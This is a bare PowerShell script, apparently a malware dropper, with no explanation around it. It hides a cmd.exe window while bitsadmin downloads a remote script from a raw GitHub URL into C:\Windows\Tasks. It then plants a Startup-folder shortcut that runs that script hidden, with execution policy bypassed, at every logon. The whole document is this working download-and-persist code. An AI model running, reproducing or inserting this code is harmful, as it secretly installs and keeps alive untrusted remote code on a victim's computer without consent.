$process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = "C:\Windows\System32\cmd.exe"; $process.StartInfo.Arguments = "/c bitsadmin /transfer mydownloadjob /download /priority high https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.ps1 C:\Windows\Tasks\s.ps1"; $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $process.Start() 

New-Object -ComObject WScript.Shell | ForEach-Object { $_.CreateShortcut([System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'powershell.lnk')) | ForEach-Object { $_.TargetPath = "powershell.exe"; $_.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "C:\Windows\Tasks\s.ps1"'; $_.IconLocation = "powershell.exe, 0"; $_.Save() } }

